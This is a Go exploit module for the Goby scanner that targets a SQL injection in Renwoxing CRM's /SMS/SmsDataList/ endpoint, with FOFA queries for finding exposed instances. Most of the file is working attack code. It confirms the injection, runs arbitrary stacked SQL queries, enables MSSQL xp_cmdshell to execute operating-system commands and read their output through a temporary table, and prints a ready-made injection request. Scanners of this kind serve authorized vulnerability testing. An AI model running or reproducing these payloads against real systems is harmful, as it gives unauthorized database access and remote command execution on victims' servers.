package exploits

import (
	"encoding/json"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Renwoxing CRM /SMS/SmsDataList/ interface SmsDataList param SQL injection Vulnerability",
    "Description": "<p>Renwoxing CRM system is an enterprise management software that integrates OA automation office, OM target management, KM knowledge management, and HR human resources.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "Renwoxing-CRM",
    "Homepage": "https://www.wecrm.com/",
    "DisclosureDate": "2022-07-24",
    "Author": "橘先生",
    "FofaQuery": "body=\"Resources/css/crmbase\" || body=\"CrmMainFrame/LoginNew\" || body=\"/Resources/imgs/defaultannex/loginpictures/\" || title=\"欢迎使用任我行CRM\"",
    "GobyQuery": "body=\"Resources/css/crmbase\" || body=\"CrmMainFrame/LoginNew\" || body=\"/Resources/imgs/defaultannex/loginpictures/\" || title=\"欢迎使用任我行CRM\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1、 There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.wecrm.com/\">https://www.wecrm.com/</a></p><p>2、 Deploy a web application firewall to monitor database operations.</p><p>3、 If not necessary, prohibit public network access to the system.</p><p></p><p><a href=\"https://pandorafms.com/\"></a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,cmd,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "create table a27bEfDc85B953ABe(resp varchar(8000));",
            "show": "attackType=sql"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "任我行 CRM /SMS/SmsDataList/ 接口 SenderTypeId 参数 SQL 注入漏洞",
            "Product": "任我行CRM",
            "Description": "<p>任我行 CRM 系统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管理软件。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.wecrm.com/\">https://www.wecrm.com/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p><p><a target=\"_Blank\" href=\"https://pandorafms.com/\"></a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Renwoxing CRM /SMS/SmsDataList/ interface SmsDataList param SQL injection Vulnerability",
            "Product": "Renwoxing-CRM",
            "Description": "<p>Renwoxing CRM system is an enterprise management software that integrates OA automation office, OM target management, KM knowledge management, and HR human resources.<br></p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1、 There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.wecrm.com/\">https://www.wecrm.com/</a><br></p><p>2、 Deploy a web application firewall to monitor database operations.</p><p>3、 If not necessary, prohibit public network access to the system.</p><p style=\"text-align: justify;\"></p><p style=\"text-align: justify;\"><a href=\"https://pandorafms.com/\"></a></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-01",
    "PocId": "10695"
}`

	sendPayload5151dsfsdx := func(hostInfo *httpclient.FixUrl, postBody string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/SMS/SmsDataList/?pageIndex=1&pageSize=30")
		sendConfig.Data = "Keywords=&StartSendDate=2006-01-02&EndSendDate=2006-01-02&SenderTypeId=" + postBody
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload5151dsfsdx(hostInfo, `0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI`)
			return err == nil && resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "0xe10adc3949ba59abbe56e057f20f883e")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sql := goutils.B2S(singleScanConfig.Params["sql"])
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			if attackType == "sql" {
				sql = "0000000000';  " + sql + " -- "
			} else if attackType == "cmd" {
				sql = goutils.B2S(singleScanConfig.Params["cmd"])
			} else if attackType == "sqlPoint" {
				sql = `0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI`
			} else {
				expResult.Output = "不存在该利用方式"
				return expResult
			}
			if sql == "0000000000';   -- " || len(sql) == 0 {
				expResult.Output = "sql语句不能为空"
				return expResult
			}

			if attackType == "sql" {
				resp, err := sendPayload5151dsfsdx(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				var data map[string]interface{}
				err = json.Unmarshal([]byte(resp.RawBody), &data)
				if err != nil {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				if strings.Contains(resp.RawBody, "\"errorCode\":-1") {
					outcome, ok := data["error"].(map[string]interface{})["message"].(string)
					if !ok || outcome == "" || strings.Contains(resp.RawBody, "语法错误") {
						outcome = "Error executing sql: " + sql
						expResult.Success = false
					}
					expResult.Output = outcome
					return expResult
				}
				if !strings.Contains(resp.RawBody, "TotalCount") {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				} else {
					expResult.Output += "成功执行 sql 语句"
				}
				return expResult
			}
			if attackType == "cmd" {
				tableName := "a" + goutils.RandomHexString(16)
				createTable := "create table " + tableName + "(resp varchar(8000));"
				xpCmdShellOpen := "0000000000' and 1=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; -- "
				xpCmdShellClose := "0000000000' and 1=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE; -- "
				execCommand := `insert into ` + tableName + "(resp) execute master ..xp_cmdshell '" + sql + "';"
				sendExecRequest := "0000000000' and 1=1;" + createTable + execCommand + " -- "
				response, err := sendPayload5151dsfsdx(expResult.HostInfo, xpCmdShellOpen)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if !strings.Contains(response.RawBody, "\"TotalCount\":0") {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				response, err = sendPayload5151dsfsdx(expResult.HostInfo, sendExecRequest)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if !strings.Contains(response.RawBody, "\"TotalCount\":0") {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				outcomeResponse, err := sendPayload5151dsfsdx(expResult.HostInfo, "0000000000' union select resp from "+tableName+" -- ")
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if !strings.Contains(outcomeResponse.Utf8Html, "varchar") {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				response, err = sendPayload5151dsfsdx(expResult.HostInfo, xpCmdShellClose)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if !strings.Contains(response.RawBody, "\"TotalCount\":0") {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				response, err = sendPayload5151dsfsdx(expResult.HostInfo, "0000000000' and 1=1;DROP TABLE "+tableName+"; -- ")
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if !strings.Contains(response.RawBody, "\"TotalCount\":0") {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				var data map[string]interface{}
				err = json.Unmarshal([]byte(outcomeResponse.RawBody), &data)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				outcome, ok := data["error"].(map[string]interface{})["message"].(string)
				if !ok {
					expResult.Output = "Error executing command: " + sql
					return expResult
				}
				match := regexp.MustCompile(" '(.*?)' ").FindStringSubmatch(outcome)
				if len(match) > 1 {
					expResult.Success = true
					expResult.Output = match[1]
				}
				return expResult
			}
			if attackType == "sqlPoint" {
				resp, _ := sendPayload5151dsfsdx(expResult.HostInfo, sql)
				if resp == nil {
					expResult.Output = "漏洞利用失败"
					return expResult
				} else if !strings.Contains(resp.Utf8Html, "0xe10adc3949ba59abbe56e057f20f883e") {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = `漏洞利用数据包如下：

POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 170
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

Keywords=&StartSendDate=2007-01-20&EndSendDate=2007-01-20&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
`
			}
			return expResult
		},
	))
}
